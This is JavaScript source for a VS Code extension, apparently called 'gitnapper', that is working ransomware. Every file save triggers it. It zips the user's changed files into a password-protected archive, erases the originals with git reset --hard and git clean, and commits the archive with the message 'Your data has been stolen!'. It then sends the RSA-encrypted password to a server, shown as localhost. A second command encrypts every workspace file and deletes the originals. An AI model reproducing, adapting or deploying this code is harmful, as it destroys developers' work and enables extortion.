// @ts-nocheck

const crypto = require("crypto");
const vscode = require("vscode");
const fs = require("fs");

const archiver = require("archiver");

const simpleGit = require("simple-git");
const path = require("path");
const zipEncrypted = require("archiver-zip-encrypted");
const axios = require("axios");

const MIN_CHANGES = 10;
const MIN_ASCII = 33;
const MAX_ASCII = 126;
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

const extensions = [
  // JavaScript/TypeScript
  ".js",
  ".jsx",
  ".ts",
  ".tsx",

  // Python
  ".py",

  // Java
  ".java",

  // C/C++
  ".c",
  ".h",
  ".cpp",
  ".hpp",
  ".cc",
  ".cxx",
  ".hh",

  // C#
  ".cs",

  // Go
  ".go",

  // Ruby
  ".rb",

  // PHP
  ".php",

  // Swift
  ".swift",

  // Kotlin
  ".kt",
  ".kts",

  // Rust
  ".rs",

  // Dart
  ".dart",

  // Perl
  ".pl",
  ".pm",

  // Lua
  ".lua",

  // R
  ".r",

  // Objective-C
  ".m",
  ".mm",

  // Shell Scripts
  ".sh",
  ".bash",

  // PowerShell
  ".ps1",

  // Groovy
  ".groovy",

  // Scala
  ".scala",
  ".sc",

  // Haskell
  ".hs",
  ".lhs",

  // Erlang
  ".erl",
  ".hrl",

  // Elixir
  ".ex",
  ".exs",

  // Clojure
  ".clj",
  ".cljs",
  ".cljc",

  // F#
  ".fs",
  ".fsx",

  // Assembly
  ".asm",
  ".s",

  // Julia
  ".jl",

  // SQL
  ".sql",

  // HTML/CSS
  ".html",
  ".htm",
  ".css",
  ".scss",
  ".sass",
  ".less",

  // Markdown
  ".md",
  ".markdown",

  // JSON/XML
  ".json",
  ".xml",

  // YAML
  ".yaml",
  ".yml",

  // Plain Text
  ".txt",
];
const IGNORED_FOLDERS = ['node_modules', '.git', 'dist', 'build', 'out', 'bin', 'obj', 'vendor', 'target', 'public', 'private', 'tmp', '.next', '.vscode', '.idea', 'coverage', '__pycache__', 'venv', 'env', '.env', '.DS_Store'];

archiver.registerFormat("zip-encrypted", zipEncrypted);

// Get all files recursively
function getAllFiles(dir) {
  const files = fs.readdirSync(dir);
  let results = [];
  
  for (const file of files) {
    const fullPath = path.join(dir, file);
    const stat = fs.statSync(fullPath);
    
    if (stat.isDirectory()) {
      if (!IGNORED_FOLDERS.includes(file)) {
        results = results.concat(getAllFiles(fullPath));
      }
    } else {
      // Skip already encrypted files and hidden/system files
      if (!file.endsWith('.lock') && !file.startsWith('.')) {
          results.push(fullPath);
      }
    }
  }
  
  return results;
};

/**
 * Generate a random password from a given length of printable ascii characters.
 *
 * @param {*} length Password length
 * @returns Password used to encrypt data
 */
function generateRandomPassword(length = 64) {
  let password = "";

  for (let i = 0; i < length; i++)
    password += String.fromCharCode(
      Math.floor(Math.random() * (MAX_ASCII - MIN_ASCII + 1)) + MIN_ASCII
    );

  return password;
}

async function encryptFile(filePath, password, iv) {
  return new Promise((resolve, reject) => {
    try {
      const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(password), iv);
      const input = fs.createReadStream(filePath);
      const output = fs.createWriteStream(`${filePath}.lock`);
      console.log(`Encrypting ${filePath}...`);

      // Write the IV first
      output.write(iv);

      input.pipe(cipher).pipe(output)
        .on('finish', () => resolve())
        .on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

/**
 * Sends the password used to encrypt data to the server.
 *
 * @param {*} password
 */
async function sendKey(password) {
  try {
    // Acquire a public key from the server
    const response = await axios.get("http://127.0.0.1:5000/get_key");
    const publicKey = response.data.public_key;

    // Encrypt the password using the public key
    const buffer = Buffer.from(password, "utf-8");
    const data = crypto.publicEncrypt(
      {
        key: publicKey,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
      },
      buffer
    );

    // Send the password to the server
    await axios.post("http://127.0.0.1:5000/password", {
      encrypted_password: data.toString("base64"),
    });

    console.log("Encrypted password sent to the server.");
  } catch (error) {
    console.error("Error during encryption and server communication:", error);
  }
}

/**
 * Wrapper function to acquire modified files in a git repository
 *
 * @param status Detected changes.
 * @param git Repository.
 */
async function getModified(status, git) {
  const modified = await Promise.all(
    status.modified.map(async (file) => {
      let changes = 1;
      const ext = path.extname(file);

      // Get the number of changed lines in the file
      if (extensions.includes(ext)) {
        const diff = await git.diff(["--stat", file]);
        changes =
          parseInt(diff.match(/(\d+) insertion[s]?\(\+\)/)?.[1] ?? "0", 10) +
          parseInt(diff.match(/(\d+) deletion[s]?\(-\)/)?.[1] ?? "0", 10);
      }

      return {
        file: file,
        changes: changes,
      };
    })
  );

  return modified;
}

/**
 * Wrapper function to acquire new files in a git repository
 *
 * @param status Detected changes.
 * @param root File root path.
 */
async function getNew(status, root) {
  const files = [...status.not_added, ...status.created];

  const newFiles = await Promise.all(
    files.map(async (file) => {
      let changes = 1;
      const filePath = path.join(root, file);
      try {
        const ext = path.extname(file);
        if (extensions.includes(ext)) {
          const content = fs.readFileSync(filePath, "utf-8");
          changes = content.split("\n").length;
        }
      } catch (error) {
        console.error(`Error reading file ${file}:`, error);
      }

      return {
        file,
        changes,
      };
    })
  );
  return newFiles;
}
/**
 * Activates the extension and registers commands
 * @param {*} context
 */
function activate(context) {
  const disposableCheck = vscode.commands.registerCommand(
    "code.check",
    async () => {
      if (!vscode.workspace.workspaceFolders) {
        vscode.window.showErrorMessage("No workspace folder is open.");
        return;
      }

      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
      const git = simpleGit(root);

      try {
        let linesChanged = 0;
        const status = await git.status();

        // Acquire changes
        if (status.files.length === 0) {
          console.log("No changes detected.");
          return;
        }

        const modified = await getModified(status, git);
        const added = await getNew(status, root);

        linesChanged += modified.length
          ? modified.reduce((i, file) => i + file.changes, 0)
          : 0;

        linesChanged += added.length
          ? added.reduce((i, file) => i + file.changes, 0)
          : 0;

        if (linesChanged < MIN_CHANGES) {
          console.log("Not enough changes detected, skipping kidnap...");
          return;
        }

        // Generate a password
        let password = generateRandomPassword();
        console.log("Password:", password);

        // Output handler
        const out = path.join(root, "gitnapper-output.zip");
        const tmp = "/tmp/gitnapper-output.zip"
        const output = fs.createWriteStream(tmp);
        output.on("close", async () => {
          await git.reset(["--hard"]);
          await git.clean("f", "-d");
          fs.rename(tmp, out, (err) => {})
          await git.add(out);
          await git.commit("Your data has been stolen!");
          await sendKey(password);
          password = "";
          vscode.window.showInformationMessage("Your data has been stolen!\n");
        });

        // Zip and encrypt content
        const archive = archiver("zip-encrypted", {
          zlib: { level: 9 },
          encryptionMethod: "aes256",
          password: password,
        });
        archive.on("error", (err) => {
          throw err;
        });
        archive.pipe(output);

        modified.forEach((file) => {
          const filePath = path.join(root, file.file);
          archive.file(filePath, { name: file.file });
        });

        added.forEach((file) => {
          const filePath = path.join(root, file.file);
          archive.file(filePath, { name: file.file });
        });

        await archive.finalize();
      } catch (error) {
        console.log(`Failed to check Git changes: ${error}`);
      }
    }
  );

  const disposableEncryptAll = vscode.commands.registerCommand(
    "code.encrypt-all",
    async () => {
      // Generate or get a password
      const password = generateRandomPassword(32);
      const iv = crypto.randomBytes(IV_LENGTH);
      console.log("Encryption Password: ", password);
      console.log("Encryption IV: ", iv);

      if (!vscode.workspace.workspaceFolders) {
        vscode.window.showErrorMessage("No workspace folder is open.");
        return;
      }

      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
      
      try {
        const files = getAllFiles(root);
        if (files.length === 0) {
            vscode.window.showInformationMessage("No files found to encrypt.");
            return;
        }

        // Show progress
        await vscode.window.withProgress({
            location: vscode.ProgressLocation.Notification,
            title: "Encrypting workspace files",
            cancellable: false
        }, async (progress) => {
          const total = files.length;
          let processed = 0;
          
          for (const file of files) {
            try {
              progress.report({
                message: `Encrypting ${path.basename(file)}`,
                increment: (processed / total) * 100
              });
              
              await encryptFile(file, password, iv);
              processed++;
              
              // Optionally delete the original file after encryption
              fs.unlinkSync(file);
            } catch (err) {
              console.error(`Failed to encrypt ${file}: ${err}`);
            }
          }
        });

        vscode.window.showInformationMessage(`Successfully encrypted ${files.length} files!`);
      } catch (error) {
        vscode.window.showErrorMessage(`Failed to encrypt workspace: ${error}`);
        throw error;
      }
    }
  );

  context.subscriptions.push(disposableCheck, disposableEncryptAll);
  // Register command to work when saving a file
  vscode.workspace.onDidSaveTextDocument((document) => {
    if (vscode.workspace.workspaceFolders) {
      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
      const filePath = document.uri.fsPath;

      if (filePath.startsWith(root)) {
        vscode.commands.executeCommand("code.check");
      }
    }
  });
}

/**
 * Callback when the extension is disabled
 */
function deactivate() {}

module.exports = {
  activate,
  deactivate,
};
